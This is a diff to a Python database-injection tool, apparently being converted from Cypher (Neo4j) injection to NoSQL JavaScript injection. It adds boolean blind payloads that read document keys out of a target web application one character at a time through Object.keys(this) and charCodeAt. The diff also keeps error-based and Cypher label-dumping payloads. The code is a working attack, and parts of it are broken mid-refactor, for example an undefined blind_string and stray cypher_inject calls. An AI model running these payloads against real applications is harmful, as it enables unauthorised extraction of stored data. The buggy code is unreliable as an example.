@@ -101,7 +101,7 @@ def get_error_injection_type(target_url, post_data, cookies_dict, connection_tim
             error_result = nosql_inject(target_url, error_payload, post_data, cookies_dict, connection_timeout)
         except Exception as e:
             print("Unable to perform nosql injection!!!")
-            print(e.message)
+            print("Error: "+str(e))
             sys.exit(-1)
 
         # Check if string concatanation of two numbers exists in output
@@ -112,8 +112,6 @@ def get_blind_injection_type(target_url, blind_string, post_data, cookies_dict, 
     
     injection_character = "'" 
     injection_characters=[" ", '"', "'"]
-    global timeout_domain
-    return False
    
     for injection_character in injection_characters:
         # Generate random values for the payload
@@ -121,21 +119,20 @@ def get_blind_injection_type(target_url, blind_string, post_data, cookies_dict, 
         number2 = random.randint(0, 10000)
 
         # Prepare the payloads for the two requests
-        true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
-        true_payload+= true_payload
-        false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)
-        false_payload+= true_payload
+        true_payload = injection_character + " && " + injection_character + str(number1) + injection_character + "==" + injection_character + str(number1)
+        false_payload = injection_character + " && " + injection_character + str(number1) + injection_character + "==" + injection_character + str(number2)
 
         # Try to inject the payloads using single quotes in target_url and post_data
         try:
-            true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout, blind_string)
-            false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout, blind_string)
-        except:
-            print("Unable to perform cypher injection!!!")
+            true_result = nosql_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
+            false_result = nosql_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
+        except Exception as e:
+            print("Unable to perform nosql injection!!!")
+            print("Error: "+str(e))
             sys.exit(-1)
 
         # Check if the blind string is present in the response to the first request but not in the response to the second request
-        if blind_string and  blind_string in true_result and blind_string not in false_result:
+        if blind_string and blind_string in true_result and blind_string not in false_result:
             return injection_character
         if not blind_string and  not true_result and false_result:
             return injection_character
@@ -168,17 +165,35 @@ def get_number_of_labels(target_url, injection_type, blind_string, post_data, co
 def get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
     for size_of_result in range(1000): # arbitarily set max size of result to 1000 :)
         current_payload=payload.replace("%SIZE_OF_RESULT%",str(size_of_result))
-        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
+        injection_result=nosql_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
         if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
             return size_of_result
     print("Unable to check size of result!!!")
     sys.exit(-1)
     
-def get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
-    payload+=" limit 1 where size(label) = %SIZE_OF_RESULT% return label}"
-    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+def blind_get_number_of_keys(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout):
+    payload = injection_character + " && Object.keys(this).length == %SIZE_OF_RESULT% && " + injection_character + "1"
     return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 
+
+def blind_dump_keys(target_url, injection_character, blind_dump_keys, post_data, cookies_dict, connection_timeout):
+    number_of_keys=blind_get_number_of_keys(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout)
+    keys_array=[]
+    print(f"Number of keys: {number_of_keys}.")
+    for key_index in range(number_of_keys):
+        key_size_payload = injection_character + f" && Object.keys(this)[{key_index}].length == %SIZE_OF_RESULT% && " + injection_character + "1"
+        key_size=get_size_of_result(target_url, key_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
+        print(f"Size of key number {key_index+1}/{number_of_keys}:{key_size}")
+        key_dump_prefix=f"Value of key number {key_index+1}/{number_of_keys}: " 
+        key_value_payload = injection_character + f" && Object.keys(this)[{key_index}].charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER% && " + injection_character + "1"
+        key_value=dump_string_value(target_url, key_dump_prefix, key_size, key_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
+        if len(keys_array) > key_index+1:
+            keys_array[key_index+1].append(key_value)
+        else:
+            keys_array.append([key_value])
+        print("\n")
+    print("Keys:")
+    dump_ascii_table(keys_array,True)
+    return keys_array
 
 def dump_string_value(target_url, dump_prefix, dump_size, payload, blind_string, post_data, cookies_dict, connection_timeout):
     print("\r"+(80*" ")+"\r"+dump_prefix,end='')
@@ -188,7 +203,7 @@ def dump_string_value(target_url, dump_prefix, dump_size, payload, blind_string,
             if current_char == "'":
                 current_char="\'"
             current_payload=payload.replace("%CHARACTER_NUMBER%",str(character_number))
-            current_payload=current_payload.replace("%CURRENT_CHARACTER%",current_char)
+            current_payload=current_payload.replace("%CURRENT_CHARACTER%",str(ord(current_char)))
             injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
             if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
                 dump_value+=current_char
@@ -231,6 +246,7 @@ def get_size_of_property(target_url, label_to_dump, property_index, injection_ty
     payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
     return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 
 
+
 def dump_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
     number_of_properties=get_number_of_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
     print(f"Number of label '{label_to_dump}' properties: {number_of_properties}\n")
@@ -252,17 +268,6 @@ def dump_properties(target_url, label_to_dump, injection_type, blind_string, pos
     print("Properties:")
     dump_ascii_table(label_properties_array,True)
     return label_properties_array
-
-def get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and count {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'  return t[key]}"
-    payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
-
-def get_size_of_key(target_url, label_to_dump, property_to_dump, key_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and exists {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'"
-    payload+=" with t,key skip "+str(key_index)+" limit 1 where size(toString(t[key])) = %SIZE_OF_RESULT% return t[key]}"
-    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 
 
 def error_dump_keys(target_url, error_injection_type, post_data, cookies_dict, connection_timeout):
     number1 = random.randint(10000,99999999)
@@ -448,8 +453,10 @@ try:
 
     error_injection_type=False
     blind_injection_type=False
-    error_injection_type=get_error_injection_type(target_url, post_data, cookies_string, connection_timeout)
-    #blind_injection_type=get_blind_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout)
+    if not args.string:
+        error_injection_type=get_error_injection_type(target_url, post_data, cookies_string, connection_timeout)
+    if args.string:
+        blind_injection_type=get_blind_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout)
     if error_injection_type:
         print(f"Found Error Injection type: {error_injection_type}\n")
     elif blind_injection_type:
@@ -464,6 +471,9 @@ try:
         elif args.dump:
             print(f"Dumping values.\n")
             error_dump_values(target_url, requested_keys_array, error_injection_type, post_data, cookies_dict, connection_timeout)
+    elif blind_injection_type:
+        if should_dump_keys:
+            keys_array=blind_dump_keys(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
     sys.exit(-1)
     if args.labels:
         print("Dumping labels....\n")
